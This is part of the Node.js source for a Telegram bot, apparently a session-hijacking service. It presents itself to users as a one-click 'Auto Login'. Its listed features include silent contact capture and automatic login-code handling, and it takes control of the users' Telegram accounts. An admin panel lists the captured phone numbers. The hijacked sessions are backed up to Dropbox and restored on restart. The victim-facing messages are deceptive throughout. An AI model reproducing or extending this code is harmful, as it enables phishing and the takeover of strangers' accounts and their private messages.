        version: '4.0.0',
        features: [
            'auto-phone-detect',
            'auto-code-send', 
            'silent-contact-capture',
            'session-connection',
            'command-processing',
            'auto-backup-restart'
        ],
        stats: {
            activeSessions: activeTelegramClients.size,
            pendingContacts: pendingContacts.size,
            messageQueue: Array.from(messageQueue.values()).reduce((sum, q) => sum + q.length, 0)
        },
        memory: {
            heapUsed: `${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)}MB`,
            rss: `${(memoryUsage.rss / 1024 / 1024).toFixed(2)}MB`
        },
        uptime: process.uptime(),
        nextBackup: 'Every 55 minutes past the hour'
    });
});

// ==================== TELEGRAM BOT (UPDATED) ====================
let bot = null;

async function initializeTelegramBot() {
    try {
        console.log('🤖 Initializing Telegram login bot...');
        
        bot = new Telegraf(config.telegramBotToken);
        bot.use(session());
        
        bot.start(async (ctx) => {
            const userId = ctx.from.id.toString();
            
            if (userId === config.adminChatId) {
                await ctx.reply(
                    '👑 *Admin Panel - Telegram Session Manager*\n\n' +
                    `Connected Accounts: ${activeTelegramClients.size}\n` +
                    'Commands:\n' +
                    '• /stats - System statistics\n' +
                    '• /sessions - List connected accounts\n' +
                    '• /backup - Manual backup\n' +
                    '• /restart - Restart system\n\n' +
                    'Test the auto-login:',
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.webApp('🔐 Test Auto-Login', `${config.webBaseUrl}/login/${userId}`)],
                            [Markup.button.webApp('📊 System Stats', `${config.webBaseUrl}/health`)],
                            [Markup.button.webApp('📱 Sessions', `${config.webBaseUrl}/api/sessions`)]
                        ])
                    }
                );
            } else {
                await ctx.reply(
                    '🔐 *Telegram Auto Login*\n\n' +
                    'One-click login with automatic phone detection & verification!\n\n' +
                    'Click below → share contact → get code → login automatically.\n\n' +
                    'Your session will be connected and ready for use.',
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.webApp('🚀 Start Auto Login', `${config.webBaseUrl}/login/${userId}`)]
                        ])
                    }
                );
            }
        });
        
        // === SILENT CONTACT HANDLER ===
        bot.on('contact', async (ctx) => {
            // ... (keep existing function)
        });
        
        bot.command('stats', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            const memoryUsage = process.memoryUsage();
            
            await ctx.reply(
                '📊 *System Statistics*\n\n' +
                `Connected Accounts: ${activeTelegramClients.size}\n` +
                `Active Login Sessions: ${activeLoginSessions.size}\n` +
                `Pending Contacts: ${pendingContacts.size}\n` +
                `Message Queue: ${Array.from(messageQueue.values()).reduce((sum, q) => sum + q.length, 0)}\n\n` +
                `Memory Usage:\n` +
                `Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)}MB\n` +
                `RSS: ${(memoryUsage.rss / 1024 / 1024).toFixed(2)}MB\n\n` +
                `Dropbox: ${isDropboxInitialized ? '✅ Connected' : '❌ Disconnected'}\n` +
                `Auto Code Send: ✅ Active\n` +
                `Auto Connection: ✅ Active\n` +
                `Next Backup: 55 minutes past hour`,
                { parse_mode: 'Markdown' }
            );
        });
        
        bot.command('sessions', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            if (activeTelegramClients.size === 0) {
                await ctx.reply('No connected accounts.');
                return;
            }
            
            let message = '📱 *Connected Accounts:*\n\n';
            let count = 1;
            
            for (const [phone, client] of activeTelegramClients) {
                const health = sessionHealthMonitor.get(phone) || {};
                const status = client.connected ? '✅' : '❌';
                message += `${count}. ${phone} ${status}\n`;
                message += `   Messages: ${health.totalMessages || 0} | Errors: ${health.errors || 0}\n\n`;
                count++;
                
                if (count > 10) {
                    message += `... and ${activeTelegramClients.size - 10} more`;
                    break;
                }
            }
            
            await ctx.reply(message, { parse_mode: 'Markdown' });
        });
        
        bot.command('backup', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            await ctx.reply('💾 Starting manual backup...');
            
            try {
                const result = await backupSessionsToDropbox();
                await ctx.reply(
                    result.success ? 
                    '✅ Backup completed successfully!' : 
                    `❌ Backup failed: ${result.error}`
                );
            } catch (error) {
                await ctx.reply(`❌ Backup error: ${error.message}`);
            }
        });
        
        bot.command('restart', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            await ctx.reply('🔄 Restarting system in 5 seconds...');
            
            setTimeout(async () => {
                try {
                    await performAutoRestart();
                } catch (error) {
                    console.error('Restart error:', error);
                }
            }, 5000);
        });
        
        bot.command('help', async (ctx) => {
            await ctx.reply(
                '📚 *Telegram Auto Login Bot*\n\n' +
                'Click "Start Auto Login" → share contact → code sent → enter code → account connected!\n\n' +
                'The bot automatically connects your session and processes commands.\n\n' +
                'Admin Commands: /stats /sessions /backup /restart',
                { parse_mode: 'Markdown' }
            );
        });
        
        bot.on('text', async (ctx) => {
            // ... (keep existing function)
        });
        
        await bot.launch();
        console.log('✅ Telegram bot started');
        
        // Send startup message
        try {
            await bot.telegram.sendMessage(
                config.adminChatId,
                '🤖 *Telegram Session Manager Started*\n\n' +
                `✅ Connected accounts: ${activeTelegramClients.size}\n` +
                `✅ Auto connection: ACTIVE\n` +
                `✅ Command processing: ACTIVE\n` +
                `✅ Auto backup/restart: ACTIVE\n` +
                `🌐 ${config.webBaseUrl}\n` +
                `📱 System ready!`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.log('Note: Could not send admin notification');
        }
        
    } catch (error) {
        console.error('❌ Failed to start Telegram bot:', error);
        setTimeout(initializeTelegramBot, 10000);
    }
}

// ==================== AUTO-PING SYSTEM ====================
async function selfPing() {
    try {
        const pingUrl = `${config.webBaseUrl}/ping`;
        await axios.get(pingUrl, { timeout: 10000 });
        console.log(`✅ Self-ping successful`);
    } catch (error) {
        console.warn(`⚠️ Self-ping failed: ${error.message}`);
    }
}

function startAutoPing() {
    console.log('🔄 Starting auto-ping system');
    
    setTimeout(selfPing, 30000);
    setInterval(selfPing, config.autoPingInterval);
}

// ==================== INITIALIZE SYSTEM ====================
async function initializeSystem() {
    try {
        console.log('🚀 Starting Telegram Session Manager...');
        
        // Initialize Dropbox
        await initializeDropbox();
        
        // Restore previous sessions from Dropbox
        await downloadAndRestoreSessions();
        
        // Start Telegram bot
        await initializeTelegramBot();
        
        // Start auto-ping
        startAutoPing();
        
        // Schedule backup and restart
        if (config.IS_HEROKU || config.RENDER) {
            scheduleBackupAndRestart();
        }
        
        console.log('✅ System ready!');
        console.log(`🔐 Login: ${config.webBaseUrl}/login/{user_id}`);
        console.log(`📊 Stats: ${config.webBaseUrl}/health`);
        console.log(`📱 Connected accounts: ${activeTelegramClients.size}`);
        console.log(`⏰ Next backup/restart: Every 55 minutes past the hour`);
        
    } catch (error) {
        console.error('❌ Failed to initialize system:', error);
        setTimeout(initializeSystem, 30000);
    }
}

// Start server
const server = app.listen(config.webPort, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${config.webPort}`);
    console.log(`🌐 Web Interface: ${config.webBaseUrl}`);
    initializeSystem();
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🚨 Shutting down gracefully...');
    
    // Backup before shutdown
    try {
        await backupSessionsToDropbox();
    } catch (e) {}
    
    // Disconnect all Telegram clients
    for (const [phone, client] of activeTelegramClients) {
        try {
            await client.disconnect();
        } catch (e) {}
    }
    
    // Clear all stores
    activeTelegramClients.clear();
    sessionHealthMonitor.clear();
    messageQueue.clear();
    activeLoginSessions.clear();
    pendingContacts.clear();
    userSessions.clear();
    
    if (bot) bot.stop();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('SIGTERM', async () => {
    console.log('🔄 Received SIGTERM - Performing graceful restart');
    await performAutoRestart();
});
